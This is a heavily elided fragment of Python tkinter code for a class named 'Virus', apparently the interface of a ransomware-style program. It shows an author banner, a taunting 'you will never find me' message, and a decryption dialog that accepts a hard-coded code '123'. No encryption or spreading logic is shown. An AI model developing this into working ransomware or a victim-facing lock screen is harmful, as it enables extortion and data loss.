...
class Virus:
    ...
    def main(self):
        ...
        Label(self.frame, font = ('Purisa', 10), text = "Author: GUIGUI   Coders rule the world!", fg = '#00FF00', bg = '#000000').place(x = WIDTH / 2, y = 480, anchor = 'center')        
    ...
    def contact(self):
        ...
        mainText = "Sorry you will never find me..."
    ...
    def decrypt(self):
        codeDecrypt = '123'
        answer = tkinter.simpledialog.askstring('Decryption', 'Code to enter?')
        # answer = ''
        # topWindow = Tk()
        ...
        if answer == codeDecrypt:
            save()
            tkinter.messagebox.showinfo('All done!', 'The decryption is done, enjoy!')
        else:
            tkinter.messagebox.showwarning('Error!', 'The code is not correct!')
        self.timeNow()
        return
